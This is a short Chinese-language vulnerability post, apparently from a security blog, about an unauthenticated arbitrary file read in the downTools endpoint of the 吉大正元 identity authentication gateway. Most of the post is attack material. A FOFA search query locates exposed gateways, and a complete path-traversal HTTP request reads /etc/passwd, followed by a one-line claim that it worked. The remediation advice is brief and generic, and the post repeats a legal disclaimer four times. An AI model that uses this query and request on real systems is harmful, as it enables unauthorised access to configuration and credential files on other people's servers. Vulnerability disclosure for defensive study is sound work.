#  吉大正元身份认证网关 downTools 任意文件读取漏洞   
 HK安全小屋   2025-05-11 14:04  
  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
漏洞描述：  
  
吉大正元身份认证网关 downTools 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
  
影响版本：  
  
吉大正元  
  
FOFA:  
```
body="/jit_pnx_portal/" || header="server: jit_pnxcore1 web service" || title="吉大正元身份认证网关"
```  
  
POC:  
```
GET /jit_pnx_portal/downTools?fileName=../../../../../../../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close
```  
  
成功读取/etc/passwd文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI1QMKtwEcw3hWkF8JfkM0Th6Wnn07eibn1eqzdYHych97UzWbiahbo1KazC6s5lDovkotgSYgAd84HQ/640?wx_fmt=png&from=appmsg "")  
  
**修复建议**  
  
1、关闭互联网暴露面或设置访问权限，禁止非管理IP访问对应页面。  
  
2、关注厂商升级至安全版本，  
  
3、及时联系官方获取更新补丁  
  
--------  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
  
  
  
